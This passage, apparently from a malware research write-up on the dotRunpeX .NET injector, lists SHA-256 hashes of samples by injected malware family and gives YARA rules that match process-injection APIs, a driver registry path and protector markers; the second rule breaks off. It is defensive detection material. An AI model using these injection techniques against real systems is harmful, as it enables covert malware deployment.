payload</th></tr></thead><tbody><tr><td>1e7614f757d40a2f5e2f4bd5597d04878768a9c01aa5f9f23d6c87660f7f0fbc</td><td>OLD</td><td>Lokibot</td></tr><tr><td>68ae2ee5ed7e793c1a49cbf1b0dd7f5a3de9cb783b51b0953880994a79037326</td><td>OLD</td><td>Lokibot</td></tr><tr><td>317e6817bba0f54e1547dd9acf24ee17a4cda1b97328cc69dc1ec16e11c258fc</td><td>OLD</td><td>Redline</td></tr><tr><td>65cac67ed2a084beff373d6aba6f914b8cba0caceda254a857def1df12f5154b</td><td>OLD</td><td>SnakeKeylogger</td></tr><tr><td>81763d8e3b42d07d76b0a74eda4e759981971635d62072c8da91251fc849b91e</td><td>OLD</td><td>SnakeKeylogger</td></tr><tr><td>0e11704fcc3c36832ba98b80ea44a3013660d1ed3fb48158b982fed9f9050391</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>0f9e27ec1ed021fd7375ca46f233c06b354d12d57aed44132208cd9308bfee11</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>881a337aa85a4b01c08706ab941573c5dc9b76ea0e4e1c2693a9b4aa4453ec8c</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>feae44d8927dd41feaed997b3dbf7b41933496d6285b79554b83e72ae8a045c4</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>1c1fcc4133af77f07d0c0299d0320aa9f447748ebead74b429f73c44d950e38b</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>35c11f7315d2e5d04d783de4314d8cde2def382f1e3fc49ccc555337c54d63cc</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>4068637c121888476533a3bbb16bec6bc3b4f81f7b9de635ef3576d56dc54c75</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>40df5a6e6dcadbe576ce4a8b01cfb82bf3f56a87bae674200e60814eab666c6d</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>8a0d6e40e545d40956194230f03608859f2a47420a9b11b199142641bc6419ee</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>7c3803c09a0370aa6484d8ad2f5690b96212d98e45fc8f9cb6022f87dff637fc</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>93e2ea6f021951369028b73637d9558c8baf3c99d9de1a2a60c1461cb9d571bf</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>d95298befdde567b31571d16f327840fa0f0dd9c54bf876531820910418a52b6</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>149af913afd7eb2773386d14e88a46449cbc9096e0748cfbaa2e061b59525bf0</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>a73f134ab62a5c23a8c8bafabbfbd5e0408c826ba5418488639724708ec5ef28</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>aca4d6278f31f374262e0388d16ee6fdcdbbad8257374f1feaabf75b0ec23157</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>50451fda27fd8569c7b32bfe82197b82a8637cac928164e1b091a389060e957e</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>9ed8eeb1db8909c96a958d91213093d2488dc172a8d22ba62657b9bfeb044fec</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>6c08c0654726c2f793b5191d5e7c74fdf3a2461118a45aa8527a0a30e3f256fd</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>283cd48dc1368b6852c2f3168bf7a78ad593df010d9a67ed1c938508da5de783</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>b019a0535ca7466d7884825542ac6910fe037913118e1136dcac7e9ef3dc0dc9</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>b1c9b356c50230629c4697b0527fd7a0fa8d6f0e8342a1eb5b5a4f90d8f0eb86</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>5bbd9513f0872d23ca43dd553a63a12882be274fef983fab427721257d60eaec</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>9d9940b60809e3c10cd4540f8e589626a293244a999bea16c259f9712969a742</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>cd4c821e329ec1f7bfe7ecd39a6020867348b722e8c84a05c7eb32f8d5a2f4db</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>cddf8b8da972cb2e560c70d01366f582445441864fcff884b8194eb6c21a768c</td><td>NEW</td><td>AgentTesla</td></tr><tr><td>6c367333c677c2268df9deaff6ad4e711e73e53504aa1aa845bebfbfe635f1d2</td><td>NEW</td><td>ArrowRAT</td></tr><tr><td>5e3588e8ddebd61c2bd6dab4b87f601bd6a4857b33eb281cb5059c29cfe62b80</td><td>NEW</td><td>AsyncRat</td></tr><tr><td>244f2d4f3c34d00babef5f1765e91c0abda9dbd1d131fc93ecb48c91ecc801a8</td><td>NEW</td><td>AsyncRat</td></tr><tr><td>95793df9284fe35c0491e5cfa36bc8f49fd426ccdf35f5fe2f098e07d160a4dc</td><td>NEW</td><td>AveMaria/WarzoneRAT</td></tr><tr><td>55ee7efcb3d1d2e0eac0ecadd651d6a299de82d94347ef9862bc981ae619532b</td><td>NEW</td><td>BitRAT</td></tr><tr><td>13081992c0ef5c52c2b6224f3ff1ab38160bca9424e7c0470e0c175c920bdc9d</td><td>NEW</td><td>Cryptocurrency Stealer</td></tr><tr><td>0daef2c2bf086312037ebc91beec0302a7e4d1750f260d02bf815bd13c611559</td><td>NEW</td><td>Downloader</td></tr><tr><td>331ad58c524100da7e459e5c3943e970414617f60b3ed0f1a74f3bf189aafea7</td><td>NEW</td><td>Downloader</td></tr><tr><td>44a11146173db0663a23787bffbb120f3955bc33e60e73ecc798953e9b34b2f2</td><td>NEW</td><td>Downloader</td></tr><tr><td>03fcbab82603df2858f7d6fefdb6ae3cc8e17393af6d44f24634d28fccf3f181</td><td>NEW</td><td>Formbook</td></tr><tr><td>373a86e36f7e808a1db263b4b49d2428df4a13686da7d77edba7a6dd63790232</td><td>NEW</td><td>Formbook</td></tr><tr><td>50ec8a9e59e1bcb0a41477e20f5bb809a80329d56e20cf99e93d756b9e0ceefc</td><td>NEW</td><td>Formbook</td></tr><tr><td>41ea8f9a9f2a7aeb086dedf8e5855b0409f31e7793cbba615ca0498e47a72636</td><td>NEW</td><td>Formbook</td></tr><tr><td>76e129552a30fa5c914d9f946f40b2ec2bbbbeb4e5e2f324e70455725030e157</td><td>NEW</td><td>Formbook</td></tr><tr><td>8fa81f6341b342afa40b7dc76dd6e0a1874583d12ea04acf839251cb5ca61591</td><td>NEW</td><td>Formbook</td></tr><tr><td>ae4f3b6c43d5ea8ee68d862362d4e8d7b317889eb9abead948a9b791ad9d7071</td><td>NEW</td><td>Formbook</td></tr><tr><td>b4c876d1797efbef614b44e52482c835c32e8ee020975a30fa2d25ed9cf8aa2b</td><td>NEW</td><td>Formbook</td></tr><tr><td>d5eda02ff2f05d1e0d06a69018de463ab36497048a1ef2b69af93aa76ccfc07d</td><td>NEW</td><td>Formbook</td></tr><tr><td>fa3a9fc2adf9d1ca812e0951e21bf72ba3ec9ceb1c0cf0bfc0171b6d4adadf83</td><td>NEW</td><td>Formbook</td></tr><tr><td>1f2ffabb3b89e6083ca5de70f5d718295c7a633c2d957da7c4469de059efde2c</td><td>NEW</td><td>Formbook</td></tr><tr><td>bd133efea4b865f42eb05e0c92e3ab3b58ac087c0682ea9112b96596a7111ff6</td><td>NEW</td><td>Formbook</td></tr><tr><td>e6da2d860bd2d0e8b56737b4c8c47cdeea78a404cd0d6fa5a26cbb5ac7682d1d</td><td>NEW</td><td>Formbook</td></tr><tr><td>d87a200a26d07a64272e93fb3ae8f8d9e4d34bdfedb0cf7c685a6c97912e967f</td><td>NEW</td><td>LgoogLoader</td></tr><tr><td>7120cf1ad3fdcae7ba6956749a8988e8181837a05948b432cec6ae11229b1d12</td><td>NEW</td><td>LgoogLoader</td></tr><tr><td>304847c69875ec59995fbb453f8d1106f80c5eb380ae6b8676e76f5372290194</td><td>NEW</td><td>NetWire</td></tr><tr><td>25fbe0ff3274b4bc981fa6ec0459e9b95cec6397194e10ea6287bf4b899a9b07</td><td>NEW</td><td>PrivateLoader</td></tr><tr><td>1bc7fc0a4796f7780223b4f0bf8d6816b3721f0b52eedc0df9a32dc4ea4829e8</td><td>NEW</td><td>PrivateLoader</td></tr><tr><td>75236a06aadafc69cc5aa8032468869fb868a9a100b687f19c66be03410c2487</td><td>NEW</td><td>PrivateLoader</td></tr><tr><td>ee0d55b9a2d03c5bea9f69f98b042ab7b3064366f335a8a53096387876bf48d7</td><td>NEW</td><td>PrivateLoader</td></tr><tr><td>8de23e90bac05911cbfb6b036c6808ce7c244e4e875cb7edcdb90f75e89e5476</td><td>NEW</td><td>PrivateLoader</td></tr><tr><td>10bbfa36ddd8ea6038e2071320ee84f7a9208a5be3a4dda448e83393cdf39a4d</td><td>NEW</td><td>PrivateLoader</td></tr><tr><td>ff72f619907a25f3d99f0c3aa84710c6ff6cb4c3fd8ebad14f85f96c6da49222</td><td>NEW</td><td>PrivateLoader</td></tr><tr><td>242e1c82269725c01108e52376be8ddad39ab29da49356d10e527af6d78058f5</td><td>NEW</td><td>PrivateLoader</td></tr><tr><td>ae4d2054a6e1f9ba2c269eace61aac7259adb0645d18da82779717d83174837d</td><td>NEW</td><td>PrivateLoader</td></tr><tr><td>bf7b127b1bb81b68439851386cd3d1600bb8b9ec56135e668a88062d913410dd</td><td>NEW</td><td>PrivateLoader</td></tr><tr><td>b8bb071899ae7bd16a328c0998b3cd40261d61e564ac77f9bf3e495fab0ad267</td><td>NEW</td><td>QuasarRAT</td></tr><tr><td>17af8118607b9fc1f7b6aa82fd72f4fc115320d293e103dfe356706bb7c581b7</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>366284c1a0577937c86744349ac47e6e578da500ada3deb857ff233d9851ee6b</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>3e50f0eaf02d12653d5f757372240adcb5c16a5ab647a667637ba4c50d37aaad</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>47849f610a30d72660b1725a0b18d78c5204257b3740641727bdcbfd1ebd466a</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>507f413ac42df115988df498a90fc1ae610cafb66cb30a3a7de53e71ec90e7cd</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>57f261cc442dd9a4f1cd4ffd281c9855f4f9a736abffaf539d9df2a6ea0dd409</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>76eed1849d0a0474f9e0a58afcda2cc1ea7af316535b4b4b27ff810a162d4f8f</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>855b2e04c323a269d3731c093f0bc80ab3497a69ab8d2967847451a87f04fb0a</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>87134629723b2c6f4d0a74c35fdce89653471d9880b23f4faea6664ae151db0e</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>8bcc23ec881d61839fc57e8ec7425ac5ed625425fbf265fcb53ad73a73825b18</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>9177ba0c649f08fa6367d04091a7672fedb82215b26e08346645544f0631ebfd</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>9246ed27032429f234888b2713529001344850c608cab9f5ab7274195d330bec</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>a487e959e59bc9500c43ac270eaf345eaf28173b07ed7dd82b2495aa19cdab88</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>ada1679a193c9b17b206b3d9ff2a19d64c6c8c5f882a321381c9d5347a8b4b3e</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>c1be6f792bd51d23d848e54cd217bdf9edcbb2b89df741190929f6fa327a10cb</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>db8ed3e6dd7e6818046e7ee1e9c6c91f98aa5ce3113b14fb1c85a50a45569b18</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>ddae8737d7cc35a87274a26b886e6b48ae947aa849c3d7ecb84de6f6d553aa96</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>efa9a303af112ffb6737846755e3a995510fd65b6ced9032dc68cd7bbe4c307d</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>20b5c7f210320cf23a63ac7f76086a6e257dd0c248d77deff444cb3dcf624799</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>f0ee1ddb789207c2000f728f6adabbe344ded7cba0804926a7cfc53bdbbc54eb</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>f440309e372551fb6ee00ecca71a70a1b8b7e077fe61b0687411147b582ab415</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>21a570237cdacdb8c69679e59c4dba6aa05f123f9db7470ec34e2f4024c3646b</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>4e8bf8c770727a3b0f551adcff2716c941234708e679c868ce42532714a29d27</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>3c0c55b4ce2d90448949980fbca1fa447832f67fb864472551513b6e4eff5304</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>61b5b6a513be380d50282c1c8391a5362d746bd70506343d04bda3751c3b25de</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>a4d455f65bb4d2dde03a0686433b6d515c71b5655fa78b86a4f9bdae503c1295</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>c9d36fcce70893aa16a846b48009bbd8b46fc11c6821b750083a9c89669038cc</td><td>NEW</td><td>RecordBreaker &#8211; Raccoon Stealer 2.0</td></tr><tr><td>04a1021d0880a4f13ed8693dfe65889a5f827fe5ee9369abbc00b58efc40e69b</td><td>NEW</td><td>Redline</td></tr><tr><td>13eb08dda92356f21888d95a6611a46728dfcefcdf769e7edad1a70e958e5367</td><td>NEW</td><td>Redline</td></tr><tr><td>20330ec79f6c6edce8c3d87e3340aebc60f528d3751339e57437b178b9cb914d</td><td>NEW</td><td>Redline</td></tr><tr><td>22962d59a066795696464868700fa7d3f735bfdb494a7a879fb54668a0ca3d46</td><td>NEW</td><td>Redline</td></tr><tr><td>2b1be3ea73921adde804b85e93817869556fa9919bf7a528639a796e27351755</td><td>NEW</td><td>Redline</td></tr><tr><td>301be47a8fefa749d904425b43ae459249e2b44ff62051f3a5529d6222259f42</td><td>NEW</td><td>Redline</td></tr><tr><td>410b032a8635fba6cc30f0c2049a53f93b98128388a4a7ce2c3a0bfb33591f9f</td><td>NEW</td><td>Redline</td></tr><tr><td>43d49812cc723b3c24ca7048faa859800c7e303e074243e4348f65d34127367b</td><td>NEW</td><td>Redline</td></tr><tr><td>47c765ad0baae96498e05e3f0984002cbce6b3f1bacd1cf238681a677c2f8036</td><td>NEW</td><td>Redline</td></tr><tr><td>482765b55aecbf24eb102f531afb6c8905ab7a058a447d217be70984f15b4573</td><td>NEW</td><td>Redline</td></tr><tr><td>50b7e742eea52e18cf908cd676b87c0f145ecc3ff9692b01c90c47750fe989a7</td><td>NEW</td><td>Redline</td></tr><tr><td>70a6d43a56d267aa4fdac5a96722a2ff05e2ac1cc9ba996d173f0b3252e09898</td><td>NEW</td><td>Redline</td></tr><tr><td>7263336f1ec49f936501c508a9edf072a81002e64e52a1ed0cafb1378bb07a2a</td><td>NEW</td><td>Redline</td></tr><tr><td>770e7d287fe352f12757ebfbb4502b10f61001630d70ddf414157b12e1f5e9a3</td><td>NEW</td><td>Redline</td></tr><tr><td>87f5b4385a2a87229b6c448a3b4b19a7e75fe6bc607dffc0e1f860e9e4499eca</td><td>NEW</td><td>Redline</td></tr><tr><td>adc5669dd1153111f4cc07714599145a775d8c260c1acae9c142280147d1793a</td><td>NEW</td><td>Redline</td></tr><tr><td>b80b3dae21d54eb9ccde40b9ba728ba3d45a73e0fc91adae3d7c375208631527</td><td>NEW</td><td>Redline</td></tr><tr><td>e35547cfb6ae3fe18df6d887334952e7a38cc51a230f02c7f62a5fef083de7cf</td><td>NEW</td><td>Redline</td></tr><tr><td>f570b6c46a5bb5a8757b1125c7d4b5d4aca2c7e9354ed1d34b78fd4f08280e30</td><td>NEW</td><td>Redline</td></tr><tr><td>f6aba045ca29ba39bbdcb2f8bde63efc971d138f88bf03aea2d13ddec88a0483</td><td>NEW</td><td>Redline</td></tr><tr><td>fefb4288cb41fcca85cd50653093d7b27c9c51769b03f72adf951c5a1f111ddf</td><td>NEW</td><td>Redline</td></tr><tr><td>f79273a1efb664d81f68e808b9ec963bfeb79d63bd277108863d6ae3c4801a9e</td><td>NEW</td><td>Redline</td></tr><tr><td>24c870202b3aedfcd28a8afb93b5212b791c265abd872ef94e44401d1ca309ad</td><td>NEW</td><td>Redline</td></tr><tr><td>417c3f327c2d8b54ec72a5a89280fecb589a3e0b89c281bbc077d7de445cc76b</td><td>NEW</td><td>Redline</td></tr><tr><td>948416d3aeae6f31df3341118a25a4231a7eed23b3db73a022e9da70734163c9</td><td>NEW</td><td>Redline</td></tr><tr><td>71cc196ad2103a1facd81f2b8bd985273f682019b2a88841d2f34ecc373d1d69</td><td>NEW</td><td>Redline</td></tr><tr><td>7bdb945f2dab863a299e26ab4c6dfb1e4f7321c38fe101224252d993495bc157</td><td>NEW</td><td>Redline</td></tr><tr><td>0bb4d022d6007fcaf1d0707b646063b4b66cf5177da6a1fc6c5d0fc217501d6f</td><td>NEW</td><td>Redline</td></tr><tr><td>0e918ad3e7ad983ecf6c3238991c13a230acc897193e0ad360d2eeaab42bf078</td><td>NEW</td><td>Redline</td></tr><tr><td>f413dbf6764bc73ab94428831e0ce3fc0369856aa50c4f9c0f5948eac85d2d08</td><td>NEW</td><td>Redline</td></tr><tr><td>670a96324222e6bb02bd36c7e5b100fb5d52d2d59891bd9599b1a47438ac9578</td><td>NEW</td><td>Redline</td></tr><tr><td>9049d536e6da46b63c562197ab92f511d5f5e2883eb8bf29f72217282ae25772</td><td>NEW</td><td>Redline</td></tr><tr><td>116d81561faa8c8a9cf4fbc947e9eee11185f3960daead8179a968dea143bfd0</td><td>NEW</td><td>Redline</td></tr><tr><td>9984a21c06fea77e96ba410cffb99de530201ef0c74f3e8b38b3afd4fdf0b333</td><td>NEW</td><td>Redline</td></tr><tr><td>bcc80eabe068cbbe38fa37b58e67fee54af75fa9e8a1fc30d93b7d30886d05da</td><td>NEW</td><td>Redline</td></tr><tr><td>202570439b32480e6df232977d5435be9be94822c75f89b09f571e5b03f8c9ab</td><td>NEW</td><td>Redline</td></tr><tr><td>96b5ea21a2556486cebbed76711a8bbae42de1e97e3311213833c6567a4fbbdc</td><td>NEW</td><td>Redline</td></tr><tr><td>35c53663294e5476315853228b4ae642f552c6c6b1253412a7f981c7ddf3d0b7</td><td>NEW</td><td>Remcos</td></tr><tr><td>8c451b84d9579b625a7821ad7ddcb87bdd665a9e6619eaecf6ab93cd190cf504</td><td>NEW</td><td>Remcos</td></tr><tr><td>7d8c18056e86a3b8c32b524f9de009ced61caf463abe1bca285fa305d4b5616a</td><td>NEW</td><td>Rhadamanthys</td></tr><tr><td>a2e9a2389faf04b67fbbd6fc71134860a145db7643d88ba312390493d5619302</td><td>NEW</td><td>Rhadamanthys</td></tr><tr><td>9f96e5bc9ffc9742cb10384566dc7fb232e0f0d633e643bd487b747b6e88f369</td><td>NEW</td><td>Rhadamanthys</td></tr><tr><td>71ecfddc7fe52a10bdf79c39cf9a1d911257ed0deee1bfef21386053bfe88110</td><td>NEW</td><td>Rhadamanthys</td></tr><tr><td>96e49a5ac188d49003b2fe77ad8a4c8866a94cc828dc6172d9a13a8c26e49b9b</td><td>NEW</td><td>Rhadamanthys</td></tr><tr><td>5474d15059ca4213ab1c13fba25ab8ba38559cac7ec2ab336d2411b90eab1217</td><td>NEW</td><td>SnakeKeylogger</td></tr><tr><td>eb2e2ac0f5f51d90fe90b63c3c385af155b2fee30bc3dc6309776b90c21320f5</td><td>NEW</td><td>SnakeKeylogger</td></tr><tr><td>02355d3fee5e217b25f9210ad0f6bacc3807b6ef1a59aa4d428c01017dcbcf28</td><td>NEW</td><td>Vidar</td></tr><tr><td>05f9553616bb5fdbf37bd4036c210929e08d7181de898c1bea1bdae7afb0766f</td><td>NEW</td><td>Vidar</td></tr><tr><td>0c857501e3851072db666386136929c06bcf4c8d3160b41b7d82a3ce9afca1be</td><td>NEW</td><td>Vidar</td></tr><tr><td>3418a369486e9bf2b57023dc0b02cb00f12a5214fca8bae20ff93586cc8c678a</td><td>NEW</td><td>Vidar</td></tr><tr><td>363c46dfb252d7c40d9c3bb63bdc40c2eff0ce16c0c1b77f507d73058104c6e1</td><td>NEW</td><td>Vidar</td></tr><tr><td>4c17f7ee55f9bf6fa9acaeeb9574feab39ba4a3cccd4426dfa85aaf58b90ae73</td><td>NEW</td><td>Vidar</td></tr><tr><td>4d4f97f1621334e4075e0229265ac6c5da14754eff1378a7d77ea6d3821e8a33</td><td>NEW</td><td>Vidar</td></tr><tr><td>87b92fcd04f69f9c132c9f350dbb3686888a5e388b1f787f6a658f09582c0da6</td><td>NEW</td><td>Vidar</td></tr><tr><td>99e733391ac499e78e535a98551c4d27408abfad4e56fe4c46956636655df29c</td><td>NEW</td><td>Vidar</td></tr><tr><td>b67bc78347918209973d633287c4e1f514a0917b8678c2cf2066ba80b2004f78</td><td>NEW</td><td>Vidar</td></tr><tr><td>c6e0a5e947e9f23cd0af6fa8bd44411a12212ab1de5007036926089800ac8692</td><td>NEW</td><td>Vidar</td></tr><tr><td>cb014704f53d5da64964c2b0bfc7e13bbdf389555294c6f6c98c2527f6406d6d</td><td>NEW</td><td>Vidar</td></tr><tr><td>d55f6b273254d2be71991cdbdb288cc94a7bc715c4be7ad97c0e1625bc0f2696</td><td>NEW</td><td>Vidar</td></tr><tr><td>d6fd4a75e32f78817f84de3dcb9e3fd767f602b7da1edecd06391ff62a481571</td><td>NEW</td><td>Vidar</td></tr><tr><td>e56c525248b1f9201cddcf1802377a7157029e8935696d1a9d9169e1d0501fa4</td><td>NEW</td><td>Vidar</td></tr><tr><td>e6a2575c893868e3d8ea5982699c9c2b75a07b8ec092b0cb26d7b5c3c2640f33</td><td>NEW</td><td>Vidar</td></tr><tr><td>ec875c5901e28a04b199f577b16a8ba6ac8c9ab7e90bc51a5809f668882ba54f</td><td>NEW</td><td>Vidar</td></tr><tr><td>b4a57b62569ee1ccb1c2dae148488dc9e37d738f0fed4f0a6e144caeb910f546</td><td>NEW</td><td>Vidar</td></tr><tr><td>f9c25b4755ab54ff3f8d827b6422d43ed14dbd03fd4faa266348eee177f7957f</td><td>NEW</td><td>Vidar</td></tr><tr><td>fa258b12d3f4ca1503379a4f6a800bdb1d589ef15ab8bfc20d452f70c8a0745c</td><td>NEW</td><td>Vidar</td></tr><tr><td>fcc4c20c07fdf816b7cc6dfba34d42af827ecf01e9972f266ac395e54db028af</td><td>NEW</td><td>Vidar</td></tr><tr><td>a19cabf8ce0a8012dedbf65855981db1efa3b9773365554401a74bfb7a45490f</td><td>NEW</td><td>Vidar</td></tr><tr><td>7f801c77fb61cc8d5c03e9fa3068163b595f5bf8c176628398bbbea5aa0a1b74</td><td>NEW</td><td>Vidar</td></tr><tr><td>63de4552312345e055236c82ecdc55c2bc8b3c37f363cb081f8f788b5203d759</td><td>NEW</td><td>Vidar</td></tr><tr><td>2478cd52847146b34cae6b768c794210838a3002a622ce61c2f90d075f6e0e65</td><td>NEW</td><td>Vidar</td></tr><tr><td>c5646cc9fe486f0644067fc294f83eb6a39ce6f28eea3708c9bf49e244acc0f9</td><td>NEW</td><td>Vidar</td></tr><tr><td>fc99e6083b1dcbe72fb818dbd53903f30c312731f2cfc8607f9d2bf2586be1ee</td><td>NEW</td><td>XWorm</td></tr></tbody></table></figure>\n\n\n\n<h1 class=\"wp-block-heading\">Yara</h1>\n\n\n\n<pre class=\"EnlighterJSRAW\">rule injector_ZZ_dotRunpeX {\n    meta:\n        description = \"Detects new version of dotRunpeX - configurable .NET injector\"\n    author = \"Jiri Vinopal (jiriv)\"\n    date = \"2022-10-30\"\n    hash1 = \"373a86e36f7e808a1db263b4b49d2428df4a13686da7d77edba7a6dd63790232\" // injects Formbook\n        hash2 = \"41ea8f9a9f2a7aeb086dedf8e5855b0409f31e7793cbba615ca0498e47a72636\" // injects Formbook\n        hash3 = \"5e3588e8ddebd61c2bd6dab4b87f601bd6a4857b33eb281cb5059c29cfe62b80\" // injects AsyncRat\n        hash4 = \"8c451b84d9579b625a7821ad7ddcb87bdd665a9e6619eaecf6ab93cd190cf504\" // injects Remcos\n        hash5 = \"8fa81f6341b342afa40b7dc76dd6e0a1874583d12ea04acf839251cb5ca61591\" // injects Formbook\n        hash6 = \"cd4c821e329ec1f7bfe7ecd39a6020867348b722e8c84a05c7eb32f8d5a2f4db\" // injects AgentTesla\n        hash7 = \"fa8a67642514b69731c2ce6d9e980e2a9c9e409b3947f2c9909d81f6eac81452\" // injects AsyncRat\n        hash8 = \"eb2e2ac0f5f51d90fe90b63c3c385af155b2fee30bc3dc6309776b90c21320f5\" // injects SnakeKeylogger\n    strings:\n    // Used ImplMap imports (PInvoke) \n        $implmap1 = \"VirtualAllocEx\"\n        $implmap2 = \"CreateProcess\"\n        $implmap3 = \"CreateRemoteThread\"\n        $implmap4 = \"Wow64SetThreadContext\"\n        $implmap5 = \"Wow64GetThreadContext\"\n        $implmap6 = \"NtResumeThread\"\n        $implmap7 = \"ZwUnmapViewOfSection\"\n        $implmap8 = \"NtWriteVirtualMemory\"\n        $implmap9 = \"MessageBox\" // ImplMap not presented in all samples - maybe different versions?\n        $implmap10 = \"Wow64DisableWow64FsRedirection\"\n        $implmap11 = \"Wow64RevertWow64FsRedirection\"\n        $implmap12 = \"CreateFile\"\n        $implmap13 = \"RtlInitUnicodeString\"\n        $implmap14 = \"NtLoadDriver\"\n        $implmap15 = \"NtUnloadDriver\"\n        $implmap16 = \"OpenProcessToken\"\n        $implmap17 = \"LookupPrivilegeValue\"\n        $implmap18 = \"AdjustTokenPrivileges\"\n        $implmap19 = \"CloseHandle\"\n        $implmap20 = \"NtQuerySystemInformation\"\n        $implmap21 = \"DeviceIoControl\"\n        $implmap22 = \"GetProcessHeap\"\n        $implmap23 = \"HeapFree\"\n        $implmap24 = \"HeapAlloc\"\n        $implmap25 = \"GetProcAddress\"\n        $implmap26 = \"CopyMemory\" // ImplMap added by KoiVM Protector used by this injector\n        $modulerefKernel1 = \"Kernel32\"\n        $modulerefKernel2 = \"kernel32\"\n        $modulerefNtdll1 = \"Ntdll\"\n        $modulerefNtdll2 = \"ntdll\"\n        $modulerefAdvapi1 = \"Advapi32\"\n        $modulerefAdvapi2 = \"advapi32\"\n\n        $regPath = \"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\\TaskKill\" wide // Registry path for installing Sysinternals Procexp driver\n        $rsrcName = \"BIDEN_HARRIS_PERFECT_ASSHOLE\" wide\n        $koiVM1 = \"KoiVM\"\n        $koiVM2 = \"#Koi\"\n    condition:\n        uint16(0) == 0x5a4d and uint16(uint32(0x3c)) == 0x4550 and ($regPath or $rsrcName or 1 of ($koiVM*)) and\n        24 of ($implmap*) and 1 of ($modulerefKernel*) and 1 of ($modulerefNtdll*) and 1 of ($modulerefAdvapi*) \n\n}</pre>\n\n\n\n<pre class=\"EnlighterJSRAW\">rule injector_ZZ_dotRunpeX_oldnew {\n\tmeta:\n\t\tdescription = \"Detects new and old version of dotRunpeX - configurable .NET injector\"\n    author = \"Jiri Vinopal (jiriv)\"\n    date = \"2022-10-30\"\n    hash1_New = \"373a86e36f7e808a1db263b4b49d2428df4a13686da7d77edba7a6dd63790232\" // injects Formbook\n\t\thash2_New = \"41ea8f9a9f2a7aeb086dedf8e5855b0409f31e7793cbba615ca0498e47a72636\" // injects Formbook\n\t\thash3_New = \"5e3588e8ddebd61c2bd6dab4b87f601bd6a4857b33eb281cb5059c29cfe62b80\" // injects AsyncRat\n\t\thash4_New = \"8c451b84d9579b625a7821ad7ddcb87bdd665a9e6619eaecf6ab93cd190cf504\" // injects Remcos\n\t\thash5_New = \"8fa81f6341b342afa40b7dc76dd6e0a1874583d12ea04acf839251cb5ca61591\" // injects Formbook\n\t\thash6_New = \"cd4c821e329ec1f7bfe7ecd39a6020867348b722e8c84a05c7eb32f8d5a2f4db\" // injects AgentTesla\n\t\thash7_New = \"fa8a67642514b69731c2ce6d9e980e2a9c9e409b3947f2c9909d81f6eac81452\" // injects AsyncRat\n\t\thash8_New = \"eb2e2ac0f5f51d90fe90b63c3c385af155b2fee30bc3dc6309776b90c21320f5\" // injects SnakeKeylogger\n\t\thash1_Old = \"1e7614f757d40a2f5e2f4bd5597d04878768a9c01aa5f9f23d6c87660f7f0fbc\" // injects Lokibot\n\t\thash2_Old = \"317e6817bba0f54e1547dd9acf24ee17a4cda1b97328cc69dc1ec16e11c258fc\" // injects Redline\n\t\thash3_Old = \"65cac67ed2a084beff373d6aba6f914b8cba0caceda254a857def1df12f5154b\" // injects SnakeKeylogger\n\t\thash4_Old = 